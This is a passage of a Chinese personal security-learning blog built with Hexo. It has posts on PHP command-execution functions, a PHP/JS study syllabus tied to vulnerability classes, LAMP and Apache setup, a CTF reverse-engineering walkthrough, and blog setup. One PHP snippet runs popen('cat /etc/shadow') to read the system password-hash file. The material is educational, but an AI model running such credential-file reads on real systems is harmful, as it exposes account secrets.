<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;phpinfo()&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>popen()：此函数是打开一个进程，可读取此进程的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = popen(&quot;cat /etc/shadow&quot;,&apos;r&apos;);</span><br><span class="line">echo fread($file,5000);</span><br><span class="line">pclose($file);</span><br></pre></td></tr></table></figure>
</li>
<li><p>shell_exec()：此函数需要一个变量在外接收它的结果并输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&apos;ls -al&apos;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/20/php表单+文件+代码、命令执行/" data-id="cjq4hvb3l0006oonpivfqng2m" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PHP基础总结" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/16/PHP基础总结/" class="article-date">
  <time datetime="2018-12-16T07:34:31.000Z" itemprop="datePublished">2018-12-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/16/PHP基础总结/">PHP基础总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="HTML-CSS"><a href="#HTML-CSS" class="headerlink" title="HTML + CSS"></a>HTML + CSS</h1><h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;&apos;&gt;&lt;/a&gt;</span><br><span class="line">&lt;img src=&apos;&apos;&gt;</span><br><span class="line">&lt;from action=&apos;&apos; method=&apos;&apos;&gt;</span><br><span class="line">    &lt;input type=&apos;&apos; name=&apos;&apos; value=&apos;&apos;&gt;</span><br><span class="line">&lt;/from&gt;</span><br><span class="line"></span><br><span class="line">&lt;table border=&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">    &lt;th&gt;Month&lt;/th&gt;</span><br><span class="line">    &lt;th&gt;Savings&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">    &lt;td&gt;January&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;$100&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>a img from三个标签必须掌握，了解href,src。针对于from标签，了解action,method,type,name,value.</li>
<li><p>特别是了解input中的name在PHP中的使用。</p>
</li>
<li><p>CSS作为附加，有兴趣的可以继续学习</p>
</li>
</ul>
<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul>
<li>熟练使用开发者工具</li>
<li>元素审查</li>
<li>控制台</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul>
<li>页面中加载js代码的方式（script标签直接写，使用事件调用，script使用src加载）</li>
<li>学会在js中定义变量</li>
<li>在js中使用数组</li>
<li>在js中调用函数</li>
<li>在真个html页面中，所有加载的代码，是一个整体。事件中、标签中、src文件中的代码是一个整体，可以在这三个位置使用其他位置的变量函数等。</li>
</ul>
<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><ul>
<li>常用的事件</li>
<li>事件中可以直接执行代码</li>
<li>事件可以调用函数</li>
<li>利用错误的img或其他的标签，调用onerror事件，然后加载远程的js文件，控制浏览器（在之后的xss漏洞中会用到，可以先行了解）。</li>
</ul>
<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><ul>
<li>js使用dom获取一个标签元素</li>
<li>js使用dom修改一个标签元素</li>
<li>js使用dom添加一个标签元素（学会发送get/post请求）</li>
</ul>
<h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><ul>
<li>location中几个url参数</li>
<li>document.cookie（自行了解）</li>
</ul>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="别忘了之前学的搭建lamp环境以及wamp环境"><a href="#别忘了之前学的搭建lamp环境以及wamp环境" class="headerlink" title="别忘了之前学的搭建lamp环境以及wamp环境"></a>别忘了之前学的搭建lamp环境以及wamp环境</h2><h2 id="PHP适合html结合在一起使用的。"><a href="#PHP适合html结合在一起使用的。" class="headerlink" title="PHP适合html结合在一起使用的。"></a>PHP适合html结合在一起使用的。</h2><ul>
<li>使用PHP动态的生成html页面</li>
<li>PHP标签的使用以及嵌入</li>
<li>PHP文件的后缀意义（很重要，在之后学习上传漏洞时会用到）</li>
</ul>
<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul>
<li>代码规范</li>
<li>变量以及常量</li>
<li>数据类型</li>
<li>输入（重点了解 $_GET $_POST $_SERVER $_REQUEST）</li>
<li><p>输出（echo var_dump）</p>
</li>
<li><p>各种运算符</p>
</li>
<li><p>数组（类型，数组操作添加输出元素，foreach输出元素）</p>
</li>
<li><p>字符串常用函数（count,strlen,str_split,chr,md5,htmlentities,addslashes,trim,strcmp）</p>
</li>
<li><p>条件控制（if(){}else{}, switch(){case:break;}）</p>
</li>
<li><p>循环控制（for,foreach,while）</p>
</li>
<li><p>函数（创建,传参，获取结果）</p>
</li>
<li><p>对象（能够看懂，可以自行深究）</p>
</li>
</ul>
<h2 id="表单操作"><a href="#表单操作" class="headerlink" title="表单操作"></a>表单操作</h2><ul>
<li>$_GET $_POST $_SERVER $_REQUEST</li>
</ul>
<h2 id="文件操作（漏洞任意文件读取）"><a href="#文件操作（漏洞任意文件读取）" class="headerlink" title="文件操作（漏洞任意文件读取）"></a>文件操作（漏洞任意文件读取）</h2><ul>
<li>fopen打开文件</li>
<li>fwrite写文件</li>
<li>unlink删除文件</li>
<li>读写模式</li>
<li>file_get_contents</li>
<li>file_put_content</li>
<li>可以使用PHP伪协议进行读文件（附加）以及任意文件读取（目录跳跃）</li>
</ul>
<h2 id="命令执行以及代码执行（漏洞代码命令执行）"><a href="#命令执行以及代码执行（漏洞代码命令执行）" class="headerlink" title="命令执行以及代码执行（漏洞代码命令执行）"></a>命令执行以及代码执行（漏洞代码命令执行）</h2><ul>
<li><p>system</p>
</li>
<li><p>eval</p>
</li>
</ul>
<h2 id="文件包含（漏洞任意文件包含）"><a href="#文件包含（漏洞任意文件包含）" class="headerlink" title="文件包含（漏洞任意文件包含）"></a>文件包含（漏洞任意文件包含）</h2><ul>
<li>include </li>
<li>require </li>
</ul>
<h2 id="文件上传（漏洞文件上传）"><a href="#文件上传（漏洞文件上传）" class="headerlink" title="文件上传（漏洞文件上传）"></a>文件上传（漏洞文件上传）</h2><ul>
<li><p>$_FILES</p>
</li>
<li><p>获取文件内容</p>
</li>
<li><p>获取文件信息</p>
</li>
<li><p>处理上传的文件</p>
</li>
</ul>
<h2 id="Cookie和Session（漏洞cookie伪造）"><a href="#Cookie和Session（漏洞cookie伪造）" class="headerlink" title="Cookie和Session（漏洞cookie伪造）"></a>Cookie和Session（漏洞cookie伪造）</h2><ul>
<li>setcookie</li>
<li><p>_COOKIE </p>
</li>
<li><p>session_start</p>
</li>
<li><p>$_SESSION</p>
</li>
<li><p>session_destroy</p>
</li>
</ul>
<h2 id="数据库操作（漏洞注入）"><a href="#数据库操作（漏洞注入）" class="headerlink" title="数据库操作（漏洞注入）"></a>数据库操作（漏洞注入）</h2><p>Mysql + PHP</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/16/PHP基础总结/" data-id="cjq4hvb3h0003oonp1pnha8pb" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-LAMP环境搭建" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/05/LAMP环境搭建/" class="article-date">
  <time datetime="2018-12-05T14:51:16.000Z" itemprop="datePublished">2018-12-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/05/LAMP环境搭建/">LAMP环境搭建</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="LAMP环境搭建"><a href="#LAMP环境搭建" class="headerlink" title="LAMP环境搭建"></a>LAMP环境搭建</h1><h2 id="前言壹"><a href="#前言壹" class="headerlink" title="前言壹"></a>前言壹</h2><p>这次搭建LAMP环境，使用的是centos6版本的虚拟机，设置成桥接模式。由于自身的懒惰不愿意再安装一个centos6，所以这个虚拟机是我从大佬那里直接拷贝过来使用的。但是没想到出现了找不到网卡的问题，所以在搭建环境之前，我先要把这个问题解决一下，并从此下定决心以后一定要自己安装系统    </p>
<h2 id="前言贰"><a href="#前言贰" class="headerlink" title="前言贰"></a>前言贰</h2><p>在我把虚拟机复制过来之后，我想要拿termius连接到centos6上，在查看IP的时候却发现下图的状况<br><img src="/LAMP/图片1.png" alt="网卡恢复"><br>心态再次爆炸！没办法，我只好将网卡配置文件补回来  </p>
<h1 id="网卡恢复"><a href="#网卡恢复" class="headerlink" title="网卡恢复"></a>网卡恢复</h1><p>首先查看一下本地网卡，要把Mac地址记下来<br> <img src="/LAMP/图片2.png" alt="网卡恢复"><br> 在里面能看到两个：eth0和eth1，我们需要把1的Mac地址改写到0里<br>  <img src="/LAMP/图片3.png" alt="网卡恢复"><br>  如果要把1的Mac地址改写到0里，我们要修改网卡配置文件<br>  使用命令vi /etc/sysconfig/network-scripts/ifcfg-eth0<br><img src="/LAMP/图片4.png" alt="网卡恢复">  </p>
<p>修改好了之后，重启网卡<br><img src="/LAMP/图片5.png" alt="网卡恢复"><br>就会显示出来我们新修改的网卡<br><img src="/LAMP/图片6.png" alt="网卡恢复"><br>虚拟机的问题到这里就结束了，接下来我们就可以正式的搭建LAMP了  </p>
<h1 id="正式搭建LAMP"><a href="#正式搭建LAMP" class="headerlink" title="正式搭建LAMP"></a>正式搭建LAMP</h1><p>LAMP=LINUX+APACHE+MYSQL+PHP<br>这是在Linux下最常见的提供web服务的组合之一<br>Linux 是免费开源软件，这意味着源代码可用的操作系统<br>Apache 是使用中最受欢迎的一个开放源码的WEB服务器软件<br>MySQL 是多线程、多用户的SQL数据库管理系统<br>PHP 是一种编程语言最初设计生产动态网站。PHP 是主要用于服务器端的应用程序软件  </p>
<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>  首先我们来安装Apache，为了方便我们使用yum安装（注意：yum安装要在联网的情况下才可使用）<br>  <img src="/LAMP/图片7.png" alt="网卡恢复"><br>  安装完成后如下图提示<br>   <img src="/LAMP/图片8.png" alt="网卡恢复"><br>   安装完成后，我们需要修改下域名<br>    <img src="/LAMP/图片9.png" alt="网卡恢复"><br>    输入/exam进行查找我们需要修改的地方<br>      <img src="/LAMP/图片10.png" alt="网卡恢复"><br> 将ServerName <a href="http://www.example.com:80前的注释符“#”去掉" target="_blank" rel="noopener">www.example.com:80前的注释符“#”去掉</a><br> <img src="/LAMP/图片11.png" alt="网卡恢复"><br> 开启Apache服务<br>  <img src="/LAMP/图片12.png" alt="网卡恢复"><br>  之后我们查看一下我们的服务有没有开启，running就是已经跑起来了<br>  <img src="/LAMP/图片13.png" alt="网卡恢复"><br>  开启防火墙 拦截对Apache的攻击，但是开启防火墙后，Apache需要修改规则<br>  <img src="/LAMP/图片14.png" alt="网卡恢复"><br>  修改防火墙规则 </p>
<p>  <img src="/LAMP/图片15.png" alt="网卡恢复"><br>  <img src="/LAMP/图片16.png" alt="网卡恢复"><br>  -A是追加，-p为指定协议类型一共有三种：TCP、UDP、ICMP Apache需要开启80端口，80端口作用在TCP中，所以要指定TCP类型  -m表示启用扩展功能，一般和-p配合，-p指定类型后，通过-m打开此类型的扩展功能，在这里启用TCP的扩展  -j是指定如何进行处理 DROP（丢弃），REJECT（拒绝），ACCEPT（通过）   </p>
<p>  修改完规则后，重启防火墙<br>  <img src="/LAMP/图片17.png" alt="网卡恢复"><br>  设置开机自启<br>  <img src="/LAMP/图片18.png" alt="网卡恢复"><br>  查看一下Apache<br>   <img src="/LAMP/图片19.png" alt="网卡恢复">   </p>
<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>使用命令yum install mysql mysql-server mysql-devel 安装mysql<br><img src="/LAMP/图片20.png" alt="网卡恢复"><br>安装完成<br><img src="/LAMP/图片21.png" alt="网卡恢复"><br>启动mysql服务<br><img src="/LAMP/图片22.png" alt="网卡恢复"><br>启动成功<br><img src="/LAMP/图片23.png" alt="网卡恢复"><br>初始化mysql数据库<br><img src="/LAMP/图片24.png" alt="网卡恢复"><br>提示设置密码，之后一直回车就行<br><img src="/LAMP/图片25.png" alt="网卡恢复"><br>设置开机自启<br><img src="/LAMP/图片26.png" alt="网卡恢复"><br>进入mysql，-h是本地启动 -uroot是用户 -p是密码，需要输入<br><img src="/LAMP/图片27.png" alt="网卡恢复"><br>查看主表<br><img src="/LAMP/图片28.png" alt="网卡恢复"><br>到此，Mysql就安装完了  </p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>安装PHP<br><img src="/LAMP/图片29.png" alt="网卡恢复"><br>安装完成<br><img src="/LAMP/图片30.png" alt="网卡恢复"><br>使用小黄鸭连接，在这里我要上传的是一个漏洞靶场<br><img src="/LAMP/图片31.png" alt="网卡恢复"><br>连接上centos后，上传文件<br><img src="/LAMP/图片32.png" alt="网卡恢复"><br>修改配置<br><img src="/LAMP/图片33.png" alt="网卡恢复"><br>Password默认为root，修改为自己数据库的密码<br><img src="/LAMP/图片34.png" alt="网卡恢复"><br>重启Apache<br><img src="/LAMP/图片35.png" alt="网卡恢复"><br>我们在网页中打开发现显示错误，意思是要新建一个数据库<br><img src="/LAMP/图片36.png" alt="网卡恢复"><br>进入mysql，新建一个数据库<br><img src="/LAMP/图片37.png" alt="网卡恢复"><br>查看一下数据库表<br><img src="/LAMP/图片38.png" alt="网卡恢复"><br>进入此目录，打开数据库导入SQL语句<br><img src="/LAMP/图片39.png" alt="网卡恢复"><br>显示导入成功<br><img src="/LAMP/图片40.png" alt="网卡恢复"><br>刷新网页，发现我们的网站就真正的搭建好了<br><img src="/LAMP/图片41.png" alt="网卡恢复"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/05/LAMP环境搭建/" data-id="cjq4hvb3g0002oonpegwgjvwj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Apache源码安装" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/04/Apache源码安装/" class="article-date">
  <time datetime="2018-12-04T07:34:31.000Z" itemprop="datePublished">2018-12-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/04/Apache源码安装/">Apache源码安装</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在系统的学习信息安全之前，我基本没怎么用过Linux，今天学习试着源码安装Apache，自闭了。  </p>
<h1 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备"></a>安装前的准备</h1><p><img src="/Apache安装/1.png" alt="Termius">  </p>
<h2 id="Termius"><a href="#Termius" class="headerlink" title="Termius"></a>Termius</h2><p>Termius是一款支持WINDOWS,MAC,和IOS平台的远程SSH工具，功能强大，且和teamviewer一样注册一个账号就可以在多个平台共享主机列表，一次配置后就可以跨平台使用，使用此工具连接我们的centos7  </p>
<h1 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h1><p> 首先，要安装yum groupinstall “development tools”  </p>
<p>这是在安装一个开发者工具集  </p>
<p><img src="/Apache安装/2.png" alt="Termius"><br>回车开始安装<br><img src="/Apache安装/3.png" alt="Termius"><br>安装完成<br><img src="/Apache安装/4.png" alt="Termius"><br>还要在下载一个Cyberduck，我叫它小黄鸭。  </p>
<p>这个工具是一个开放源代码的ftp及sftp客户端，只需要在IP或IT上安装openssh协议就可以将电脑和移动设备联接起来，简单的说就是可以使用它来向我们的centos里传输我们想要的文件<br> <img src="/Apache安装/5.png" alt="Termius">  </p>
<p>打开小黄鸭，新建连接<br><img src="/Apache安装/6.png" alt="Termius"><br>连接上之后就可以传输文件了<br>选择上传，找到httpd-2.4.37.tar.gz进行上传，上传之后我们进入命令窗口查看一下压缩包有没有上传上去。<br><img src="/Apache安装/7.png" alt="Termius">  </p>
<p>  在这里介绍一下httpd-2.4.37.tar.gz这其实是源码编译安装Apache/2.4.37的压缩包，这片博客的最终目的就是源码安装Apache    </p>
<p>  解压httpd-2.4.37.tar.gz压缩包，会解压出一个httpd-2.4.37文件<br>  <img src="/Apache安装/8.png" alt="Termius"><br>  <img src="/Apache安装/9.png" alt="Termius">   </p>
<p>./configure –prefix=/usr/local/apache2<br>configure是检查系统环境是否能够支撑这个程序的运行，同时还可以设置一些安装选项，比如安装路径，安装扩展程序，就像windiws安装软件一样。<br>prefix是指安装路径<br><img src="/Apache安装/10.png" alt="Termius"><br>在安装的过程中它会提示缺少依赖包，这也是在安装过程中最为复杂、繁琐的一部分      </p>
<p> 在提示缺少依赖包的情况下，我们需要查找到所缺少的依赖包，并把它们下载下来，不然是不能进行下面的步骤的  </p>
<p>   在上图中，它已经提示给我们它现在所缺少的依赖包：checking for APR…no既然它告诉我们缺少APR的依赖包，我们可以使用yum search 来对所缺少的依赖包进行查找<br><img src="/Apache安装/11.png" alt="Termius"><br>上图中，它显示给了我们安装时所有所需要的APR依赖包，我们要将这些下载下来。  </p>
<p>使用yum install +所要安装的软件<br><img src="/Apache安装/12.png" alt="Termius"><br>安装好了之后，我们再次执行./configure –prefix=/usr/local/apache2<br>命令<br><img src="/Apache安装/13.png" alt="Termius"><br>WTF!它又会提示我们缺少依赖包。。。。。<br>按照他说的继续查找安装吧。。。。。<br><img src="/Apache安装/14.png" alt="Termius"><br>看到这回所需要的依赖了吗，我已经要砸电脑了！！！算了继续下载吧。。。。。<br><img src="/Apache安装/15.png" alt="Termius"><br>下载完之后再次执行./configure –prefix=/usr/local/apache2<br><img src="/Apache安装/16.png" alt="Termius"><br>终于成功了！！！<br>接下来，我们就要对其进行编译，使用make命令，这要经过漫长的等待。<br><img src="/Apache安装/17.png" alt="Termius"><br><img src="/Apache安装/18.png" alt="Termius"><br>之后使用make install进行安装。（莫名的想到C语言，打完代码之后需要编译运行）<br><img src="/Apache安装/19.png" alt="Termius"><br><img src="/Apache安装/20.png" alt="Termius"><br>启动文件<br><img src="/Apache安装/21.png" alt="Termius"><br>在这之后我要把我的博客复制到里面，所以我要将防火墙关掉<br><img src="/Apache安装/22.png" alt="Termius"><br>在浏览器中输入IP就可以看到内容<br><img src="/Apache安装/23.png" alt="Termius"><br>之后使用小黄鸭把我的博客内容上传到路径中，路径为：/uer/local/apache2/htbocs<br><img src="/Apache安装/24.png" alt="Termius"><br>刷新网页，就会看到自己的博客了<br><img src="/Apache安装/25.png" alt="Termius"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/04/Apache源码安装/" data-id="cjq4hvb350000oonpai0sy6ks" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CTF逆向基础" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/03/CTF逆向基础/" class="article-date">
  <time datetime="2018-12-03T07:34:31.000Z" itemprop="datePublished">2018-12-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/03/CTF逆向基础/">CTF逆向基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前我开始学习信息安全的时候就是从CTF学起的。密码、隐写、web、逆向、pwn都多多少少做过一些。<br>逆向的入门是我在参加吉林省首届大学生网络安全大赛赛前培训时学习的。当时给我培训的是安恒的一位逆向大佬（给大佬递水），在培训的时候我真是听得一脸懵逼，后期培训完我有我自己学习了一段时间，才算真正了解一点逆向，并重新记录在博客中，留作纪念。</p>
<h1 id="ctf逆向基础"><a href="#ctf逆向基础" class="headerlink" title="ctf逆向基础"></a>ctf逆向基础</h1><p><img src="/tupian/1.png" alt="逆向题">  </p>
<p>这是bugkuCTF中的一道题，把这道题下载并解压，在本地中打开<br><img src="/tupian/2.png" alt="逆向题">  </p>
<p>打开OD，将re1.exe拖入。右键选择中文搜索引擎—&gt;选择“搜索ASCII”<br><img src="/tupian/3.png" alt="逆向题"><br>可以看到flag get，双击进入<br><img src="/tupian/4.png" alt="逆向题"><br>可以看到jnz指令，这是判断是否是正确的标志，再此下一个断点。如果它跳转会跳转到下面，显示flag不太对，不跳转就会显示出flag get。找到此断点后向上查找。<br><img src="/tupian/5.png" alt="逆向题"><br>从程序的输入位置之后，就是一个验证过程，在此下第二个断点。</p>
<p>运行测试，任意输入一个值，回车运行，显示断在下图这个地方。<br><img src="/tupian/6.png" alt="逆向题"><br>F8单步调试，在寄存器窗口显示出flag。<br><img src="/tupian/7.png" alt="逆向题">  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/03/CTF逆向基础/" data-id="cjq4hvb3d0001oonpqkew1eon" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-博客搭建" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/03/博客搭建/" class="article-date">
  <time datetime="2018-12-03T07:34:31.000Z" itemprop="datePublished">2018-12-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/03/博客搭建/">博客的搭建</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在学习搭建博客之前，我一直使用的是CSDN来记录自己学到的东西，但是直到自己真正开始系统的学习信息安全的时候，大佬告诉我要自己搭建一个博客来记录。<br>但是。。。。<br>我是不会放弃CSDN的！！！！！<br>花了小半天的时间学习怎么搭建博客并成功搭好，把这个作为我的第一篇帖子，不是为了纪念，而是我怕我以后忘了<br>个人博客=域名+外网服务器+本地解析  </p>
<h2 id="下载git"><a href="#下载git" class="headerlink" title="下载git"></a>下载git</h2><p>官网下载：<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a>   </p>
<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p><img src="/img/20170827093914311.jpg" alt="安装git图一">   </p>
<p><img src="/img/2.jpg" alt="安装git图二"><br><img src="/img/3.jpg" alt="安装git图三"><br><img src="/img/4.jpg" alt="安装git图四"><br><img src="/img/5.jpg" alt="安装git图五"><br><img src="/img/6.jpg" alt="安装git图六"><br><img src="/img/7.jpg" alt="安装git图七"><br><img src="/img/8.jpg" alt="安装git图八"><br>到这git就安装完了    </p>
<h2 id="下载node-js"><a href="#下载node-js" class="headerlink" title="下载node.js"></a>下载node.js</h2><p>下载地址：<a href="http://nodejs.org/download/" target="_blank" rel="noopener">http://nodejs.org/download/</a></p>
<h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><p><img src="/img/9.jpg" alt="安装node.js图一"><br><img src="/img/10.jpg" alt="安装node.js图二"><br><img src="/img/11.jpg" alt="安装node.js图三"><br><img src="/img/12.jpg" alt="安装node.js图四"><br><img src="/img/13.jpg" alt="安装node.js图五"><br><img src="/img/14.jpg" alt="安装node.js图六"><br>到此Node.js就安装完了  </p>
<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>Hexo是一个快速简洁且高效的博客框架。hexo使用Markdown解析文章，在几秒内就可生成静态网页。<br>在cmd中运行命令来安装hexo：npm install -g hexo-cli<br><img src="/img/15.png" alt="安装hexo图一">   </p>
<h2 id="新建一个名为blog的文件夹"><a href="#新建一个名为blog的文件夹" class="headerlink" title="新建一个名为blog的文件夹"></a>新建一个名为blog的文件夹</h2><p>在里面打开cmd，输入hexo init . (初始化 .是当前路径)<br>初始化后，会在blog目录下生成很多文件<br><img src="/img/16.png" alt="hexo生成文件"><br>在这些文件中，“_config.yml”是整个网站的总配置文件<br><img src="/img/17.png" alt="_config.yml">  </p>
<h2 id="修改“-config-yml”文件"><a href="#修改“-config-yml”文件" class="headerlink" title="修改“_config.yml”文件"></a>修改“_config.yml”文件</h2><p>使用VSC打开_config.yml文件，修改“title、description、author、language以及url等<br><img src="/img/18.png" alt="_config.yml">  </p>
<h2 id="登录github"><a href="#登录github" class="headerlink" title="登录github"></a>登录github</h2><p>在此之前，你需要有一个GitHub的账号，注册账号大家应该都会我就不写在上面了，截图上传太麻烦了  </p>
<p>点击右上角的加号选择“New repository”创建新库<br><img src="/img/20.png" alt="选择“New repository”"><br>创建名，名字要相同哦<br><img src="/img/19.png" alt="_config.yml"><br>初始界面大概就像下图一样，里面已经加入内容，忽略掉就是初始界面：<br><img src="/img/21.png" alt="初始界面"><br>选择“create new file”写文件<br><img src="/img/22.png" alt="_config.yml">  </p>
<h2 id="博客地址"><a href="#博客地址" class="headerlink" title="博客地址"></a>博客地址</h2><p>博客的地址：<a href="https://xiaoli24680.github.io" target="_blank" rel="noopener">https://xiaoli24680.github.io</a><br>xiaoli24680是我的用户名，大家要根据自己起的名来进行访问哦  </p>
<h2 id="下载静态文件完成访问"><a href="#下载静态文件完成访问" class="headerlink" title="下载静态文件完成访问"></a>下载静态文件完成访问</h2><h4 id="在blog目录中打开cmd窗口"><a href="#在blog目录中打开cmd窗口" class="headerlink" title="在blog目录中打开cmd窗口"></a>在blog目录中打开cmd窗口</h4><p>执行命令：hexo generate<br>目的是下载静态文件到本地<br><img src="/img/23.png" alt="_config.yml"><br>执行命令：hexo server<br>目的是开启服务器，本地访问<br><img src="/img/24.png" alt="_config.yml">  </p>
<p>  到这里你就可以打开显示出的网址，来本地查看一下自己的网站  </p>
<h2 id="同步本地文件至GitHub"><a href="#同步本地文件至GitHub" class="headerlink" title="同步本地文件至GitHub"></a>同步本地文件至GitHub</h2><p>打开GitHubDesktop并登录  </p>
<p>选择“clone a repository”<br><img src="/img/25.png" alt="_config.yml"><br>选择数据库，设置存放文件的位置，点击“clone”<br><img src="/img/26.png" alt="_config.yml"><br>把写好的文件放入上一步设置的路径中（注:必须是静态文件），打开GitHub Desktop<br><img src="/img/27.png" alt="_config.yml"><br>选择要上传的文件，写完摘要，描述，点击“commit to master”    </p>
<p>同步操作  </p>
<p><img src="/img/28.png" alt="_config.yml">  </p>
<h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><p>  自带的主题其实挺好看的，但是大佬却很嫌弃自带的主题（审美不同）。出于欣赏美的角度出发，我看了不同主题，发现好看的确实多（啪啪打脸）<br>更换主题网址：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a>  </p>
<h3 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h3><p>复制主题的路径<br><img src="/img/29.png" alt="_config.yml"><br>在/blog/themes文件夹中打开cmd，输入命令：<br>git clone 主题路径  </p>
<p>  在主配置文件中修改一下主题<br>  在blog文件夹中用visual studio code打开_config.yml文件，搜索“theme”并修改<br>  <img src="/img/30.png" alt="_config.yml">  </p>
<h2 id="接下来清空旧源代码，生成新的源代码"><a href="#接下来清空旧源代码，生成新的源代码" class="headerlink" title="接下来清空旧源代码，生成新的源代码"></a>接下来清空旧源代码，生成新的源代码</h2><p>在主配置文件（blog）中打开cmd<br>输入命令：hexo clean<br>用来清除旧文件<br><img src="/img/31.png" alt="_config.yml"><br>输入命令：hexo generate<br>用来生成新文件<br><img src="/img/32.png" alt="_config.yml"><br>输入命令：    hexo server<br>目的：开启本地服务器，在本地查看网站<br><img src="/img/33.png" alt="_config.yml">  </p>
<h3 id="上传主题"><a href="#上传主题" class="headerlink" title="上传主题"></a>上传主题</h3><p>第一步：在GitHub数据库的文件夹中删除所有文件，把blog文件夹中的public文件夹下面的所有文件复制粘贴到GitHub数据库文件夹中  </p>
<p>第二步：在GitHub desktop中添加摘要和描述，然后点击“commit to master”<br>第三步：进行同步  </p>
